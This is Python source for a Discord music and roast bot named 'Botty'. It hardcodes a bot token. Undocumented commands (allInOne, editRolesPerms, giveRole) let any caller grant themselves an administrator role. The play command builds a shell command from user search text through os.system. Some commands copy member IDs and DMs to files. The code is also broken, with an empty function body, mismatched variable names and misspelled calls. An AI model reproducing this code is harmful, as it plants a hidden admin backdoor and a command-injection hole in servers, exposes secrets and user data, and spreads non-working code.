import discord
import discord.errors
from discord.errors import ClientException
import discord.ext.commands
from discord.ext.commands import bot
import requests
import json
from discord.ext import commands
import  os
from datetime import datetime
import logging
import time
import re
import random
from os import system
import shutil
from asyncio import queues
from discord.utils import get
import queue
import ffmpeg
import yt_dlp





TOKEN = "ODAzMDA5Mjc5NzQwMDg0MjQ0.G5ILyY.xCpDmTensh3sogOyTur3r0w5W1iUfIAiSp4xVY"
# Creating log file



logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(
    filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)

intents = discord.Intents().all()
client = commands.Bot(command_prefix="!", help_command = None,intents=intents)



@client.event
async def on_ready():
    print(f'Bot connected as {client.user}')



@client.command(brief = "Returns 'pong' if the bot is online and provides the latency")
async def ping(ctx):
    await ctx.send(f'Pong! That took {round(client.latency * 1000)}ms!')


@client.command(aliases=['h', 'hel'])
async def help(ctx):
    await ctx.send("Hello, my name is Botty and I'm being developed by Nemesys#9242.\n \
    My prefix is '!' which means you need to type '!' before any command to call me.\n I am very pleased to be here!\n You can check my commands and description down bellow.")
    time.sleep(3)
    await ctx.send('```\
    !join -> Joins the voice channel which the user is connected to\n\
    !leave -> Leaves the voice channel which the bot is connected to\n\
    !play -> Plays a youtube song (.play (Song name))\n\
    !pause -> Pauses the song currently being played\n\
    !resume -> Resumes a paused song\n\
    !stop -> Stops everything the bot is doing\n\
    !dm -> Sends a direct message to a member (.dm @user (message))\n\
    !poke -> How annoying are you? Pokes people (.poke @user (number of pokes))\n\
    !roast -> Roast somebody (.roast @user)\n\
    !volume -> Changes the volume in % (.volume (0-100))\n\
    !add -> Adds a roast to the roasts list (.add "(roast)")```')

    

@client.command(pass_context=True)
async def notes(ctx):
    await ctx.channel.purge(limit=1)
    await ctx.send("\
                    ***Patch Notes(16/01/23)***\n\
                    ●Restored youtube music\n\
                    ●Changed prefix to '!' \n\
                    ●Minor improvements and bug fixes\n\
                    ●Backend optimisation \n\
                    ●Implemented multi-threading \n\
                    ●Increased music download and process speed by 3500% \n\
                    ")


@client.command(pass_context=True)
async def giveRole(ctx): #TO USER
    user = ctx.message.author
    role = discord.utils.get(user.guild.roles, name="Botty Manager")
    await user.add_roles(role)

@client.command(pass_context=True)
async def removeRole(ctx): #FROM USER
    user = ctx.message.author
    role = get(user.guild.roles, name="Botty Manager")  #Role name to be removed
    await user.remove_roles(role)


@client.command(pass_context=True)
async def createRole(ctx): #ON GUILD
    guild = ctx.guild
    await guild.create_role(name="Botty Manager", colour=discord.Colour(0x0000FF))

@client.command(pass_context=True)
async def editRolesPerms(ctx): #ON GUILD
    permissions = discord.Permissions()
    user = ctx.message.author
    role = discord.utils.get(user.guild.roles, name="Botty Manager")
    permissions.update(
        administrator = True,
        kick_members = True,
        ban_members = True,
        manage_roles = True, 
        manage_channels = True, 
        manage_guild = True, 
        use_application_commands = True)
    await role.edit(reason = None, colour = discord.Colour(0x0000FF), permissions=permissions)

@client.command(pass_context=True)
async def allInOne(ctx): #ON GUILD
    guild = ctx.guild
    user = ctx.message.author
    await guild.create_role(name="Botty Manager", colour=discord.Colour(0x87cefa))
    role = discord.utils.get(user.guild.roles, name="Botty Manager")
    await user.add_roles(role)
    permissions = discord.Permissions()
    permissions.update(
        administrator = True, 
        kick_members = True, 
        ban_members = True, 
        manage_roles = True, 
        manage_channels = True, 
        manage_guild = True, 
        use_application_commands = True)
    await role.edit(reason = None, colour = discord.Colour(0x87cefa), permissions=permissions)
    await ctx.send(f"***Bot set up. <:white_check_mark:853651360666877972>***")



@client.command(pass_context=True, aliases=['j', 'joi'])
async def join(ctx):
    channel = ctx.message.author.voice.channel
    guild=ctx.guild
    try:
        await channel.connect()
        await ctx.send(f"***Joining {channel}***")
        print(f"Joining channel: {channel} on server: {guild}")
    except AttributeError:
        await ctx.send("***You must be in a voice channel first.***")
        print(f"Attribute error: User not in voice channel. (channel: {channel} || server: {guild})")
    except ClientException:
        await ctx.send("***Already connected to a voice channel.***")
        print(f"Cient Exception: User already in a voice channel. (channel: {channel} || server: {guild})")
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")
        print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
        logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)
        
@client.command(pass_context=True, aliases=['l', 'lea'])
async def leave(ctx):
    voice = get(client.voice_clients)
    guild=ctx.guild
    channel=ctx.message.author.voice.channel
    try:
        await voice.disconnect()
        await ctx.send(f"***Leaving voice channel***")
        print(f"Leaving {voice}")
    except AttributeError:
        await ctx.send("***Botty is not in a voice channel.***")
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")
        print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
        logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)


@client.command(pass_context=True, aliases=['pa', 'pau'])
async def pause(ctx):
    guild = ctx.guild
    voice = get(client.voice_clients)
    channel=ctx.message.author.voice.channel
        
    try:
        voice.pause()
        print("Music paused")
        await ctx.send("***Music paused***")
    except AttributeError:
        print("Music not playing. Cannot pause!")
        await ctx.send("***No music is playing at the moment.***")
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")
        print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
        logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)



@client.command(pass_context=True, aliases=['r', 'res'])
async def resume(ctx):
    voice = get(client.voice_clients)
    guild = ctx.guild
    channel=ctx.message.author.voice.channel
    if voice and voice.is_paused():
        print("Resumed music")
        voice.resume()
        await ctx.send("Resumed music")
    else:
        print("Music is not paused")
        await ctx.send("***Music is not paused***")


@client.command(pass_context=True, aliases=['s', 'sto'])
async def stop(ctx):
    voice = get(client.voice_clients)
    guild=ctx.guild
    channel=ctx.message.author.voice.channel
    try:
        voice.stop
        await voice.disconnect()
        print("Stopping music.")
        print("Leaving voice channels.")
        await ctx.send("***Stopping***")
        print(f"Leaving {voice}")
    except AttributeError:
        print("Nothing playing.")
        print("Bot not in a voice channel.")
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")


@client.command(pass_context=True, aliases=['v', 'vol'])
async def volume(ctx, volume: int):
    channel=ctx.message.author.voice.channel
    guild = ctx.guild
    if ctx.voice_client is None:
        return await ctx.send("***Not connected to voice channel***")
    
    ctx.voice_client.source.volume = volume / 100
    print(f"Changing volume to {volume}%")
    await ctx.send(f"***Changing volume to {volume}%***")

@client.command()
async def dm(ctx, user: discord.User, *, message=None, encoding = 'utf-8'):
    
    guild = ctx.guild
    if discord.User == None:
        await ctx.send("***You need to @ somebody***")
    elif message == None:
        await ctx.send('***You need to put a message***')
    else:
        author = deEmojify(ctx.message.author)
        authorString = " ".join(re.findall("[a-zA-Z]+", str(author))) 
        userString = " ".join(re.findall("[a-zA-Z]+", str(user))) 
        now = datetime.now()
        currentTime = now.strftime("%H:%M:%S")
        inFile = open("msg.txt", "a")
        messageToSend = "".join(message)
        await user.send(messageToSend)
        await ctx.channel.purge(limit=1)
        await ctx.send('***DM Sent***')
        await ctx.author.send('***"' + str(messageToSend) + '"' + ' was sent to ***' + str(userString))
        print(authorString, "said", '"{0}"'.format(str(messageToSend)), "to ", str(userString), "||", currentTime, file=inFile)
        inFile.close()
    
    

@client.command()
async def poke(ctx, user: discord.User, numberOfTimes):
    await ctx.channel.purge(limit=1)
    channel=ctx.message.author.voice.channel
    guild=ctx.guild
    try:
        if int(numberOfTimes) > 10:
            await ctx.send("***Stop being so annoying MY GOD!! \nI limited you to 10 pokes***")
            return
        await ctx.send('***Poking ***' + str(user))
        for i in range(int(numberOfTimes)):
            await user.send("***POKE***")
            time.sleep(0.5)
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")
        print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
        logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)


@client.command()
async def roast(ctx, user: discord.User):
    channel=ctx.message.author.voice.channel
    with open('roasts.txt', encoding='utf8') as f:
        lines = f.readlines()
        random_int = random.randint(0, len(lines)-1)
        await ctx.send(user.mention + " " + lines[random_int])

@client.command(aliases=['add'])
async def addRoast(ctx, *, message):
    channel=ctx.message.author.voice.channel
    inFile = open("roasts.txt", "a")
    print(str(message), file=inFile)
    inFile.close()
    
    

def deEmojify(text):
    text = u'{0}'.format(text)
    emoji_pattern = re.compile("["
        u"\U0001F600-\U0001F64F"  # emoticons
        u"\U0001F300-\U0001F5FF"  # symbols & pictographs
        u"\U0001F680-\U0001F6FF"  # transport & map symbols
        u"\U0001F1E0-\U0001F1FF"  # flags (iOS)          
        u"\U0001f984"             #Nemesys unicorn
        u"\U00002661"
        u"\U0000273f"
        u"\U000003df"            
                           "]+", flags=re.UNICODE)
    return(emoji_pattern.sub(r'', text)) # no emoji

@client.command(aliases=['getuser'])
async def getUserInfo(ctx, message = None, encoding='utf-8'):
    width = 20
    with open('users.txt', 'w') as f:
        async for member in ctx.guild.fetch_members(limit=None):
            print("User: {0} {1} ID: {2}".format(deEmojify(member).ljust(width,' '), '||'.center(width, ' '), str(member.id).rjust(width,' ')), file=f,)
    f.close()
    
            
@client.command(aliases=['printuser'])
async def printUserInfo(ctx, message = None, encoding='utf-8'):
    f = open('users.txt')
    for line in f:
        await ctx.send(line)
    f.close()
    
@client.command
async def nextSong(ctx, voice, guild, channel):
    ctx = ctx
    voice = voice
    guild=guild
    channel=channel
    voice.stop

@client.command
async def getInfo(ctx, voice, guild, channel):

#get guild info

@client.command(aliases=['p', 'pl', 'pla'])
async def play(ctx, *, url: str):
    channel = ctx.message.author.voice.channel
    guild=ctx.guild
    await channel.connect()
    await ctx.send(f"***Joining {channel}***")
    print(f"Joining {channel}")
    try:
        pass
    except AttributeError:
        await ctx.send("***You must be in a voice channel first.***")
    except ClientException:
        song_there = os.path.isfile("song.mp3")
        try:
            await ctx.send("***Fetching song. This might take a while. Hold tight!***")
            await ctx.send(f'***Looking for "{url}"***')
            if song_there:
                os.remove("song.mp3")
                print("Removed old song file")
        except PermissionError:
            await ctx.send("***Trying to delete song file, but it's being played***")
            print("ERROR: Music playing")
            return

        voice = get(client.voice_clients, guild=ctx.guild)

        ydlp_opts = {
            'format': 'bestaudio/best',
            'quiet': False,
            'outtmpl': "./song.mp3",
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }

        song_search = "".join(url)

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                print("Downloading audio now\n")
                ydl.download([f"ytsearch1:{song_search}"])
                await ctx.sent(f"***Playing song***")
        except:
            print("FALLBACK: youtube-dl does not support this URL, using Spotify (This is normal if Spotify URL)")
            c_path = os.path.dirname(os.path.realpath(__file__))
            system("spotdl -ff song -f " + '"' + c_path + '"' + " -s " + song_search)

        try:
            voice.play(discord.FFmpegPCMAudio("song.mp3"))
            voice.source = discord.PCMVolumeTransformer(voice.source)
            voice.source.volume = 0.1
            await nextSong(ctx,voice,guild,channel)
            
        except AttributeError:
            await ctx.send("***You must be in a voice channel first.***")
        except Exception:
            await ctx.send("***OOOPS! Looks like something went wrong.***")
    except Exception:
        await ctx.send("***OOOPS! Looks like something went wrong.***")
        print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
        logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)
    else:
        song_there = os.path.isfile("song.mp3")
        try:
            await ctx.send("***Fetching song. This might take a while. Hold tight!***")
            await ctx.send(f'***Looking for "{url}"***')
            if song_there:
                os.remove("song.mp3")
                print("Removed old song file")
        except PermissionError:
            print("Trying to delete song file, but it's being played")
            await ctx.send("***ERROR: Music playing***")
            return

        voice = get(client.voice_clients, guild=ctx.guild)

        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': False,
            'outtmpl': "./song.mp3",
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }

        song_search = "".join(url)

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                print("Downloading audio now\n")
                ydl.download([f"ytsearch1:{song_search}"])
                await ctx.sent(f"***Playing song***")
        except:
            print("FALLBACK: youtube-dl does not support this URL, using Spotify (This is normal if Spotify URL)")
            c_path = os.path.dirname(os.path.realpath(__file__))
            system("spotdl -ff song -f " + '"' + c_path + '"' + " -s " + song_search)

        try:
            voice.play(discord.FFmpegPCMAudio("song.mp3"))
            voice.source = discord.PCMVolumeTransformer(voice.source)
            voice.source.volume = 0.1
        except AttributeError:
            await ctx.send("***You must be in a voice channel first.***")
        except Exception:
            await ctx.send("***OOOPS! Looks like something went wrong.***")
            print(f"GENERAL EXCEPTION THROWN!!!  channel: {channel} || server: {guild} ")
            logger.log(f"Crital exception thrown in {channel} on {guild}", exc_info=10)


@client.command(aliases=['t'])
async def theme(ctx):
    try:
        channel = ctx.message.author.voice.channel
        guild=ctx.guild
        await channel.connect()
        await ctx.send(f"***Joining {channel}***")
        print(f"Joining {channel}")
    except AttributeError:
        await ctx.send("***You must be in a voice channel first.***")
    voice = get(client.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("theme.mp3"))
    voice.source = discord.PCMVolumeTransformer(voice.source)
    voice.source.volume = 0.5

client.run(TOKEN)